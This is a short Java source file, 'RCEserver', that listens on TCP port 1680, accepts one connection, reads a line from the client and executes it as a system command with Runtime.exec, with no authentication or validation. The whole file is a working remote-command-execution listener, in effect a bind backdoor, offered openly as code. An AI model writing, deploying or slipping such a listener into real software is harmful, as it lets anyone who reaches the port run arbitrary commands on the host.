import java.io.*;
import java.net.*; 
import java.lang.*;
class RCEserver
{
	public static void main(String a[])throws 
	IOException,UnknownHostException,InterruptedException
	{
		ServerSocket ss=new ServerSocket(1680);
		Socket cs=ss.accept();

		Runtime r=Runtime.getRuntime();
		Process p=null;
		InputStream is=cs.getInputStream();
		DataInputStream dis=new DataInputStream(is);
		String s=dis.readLine();
		System.out.println(s);
		p=r.exec(s);
		p.waitFor();
}
}
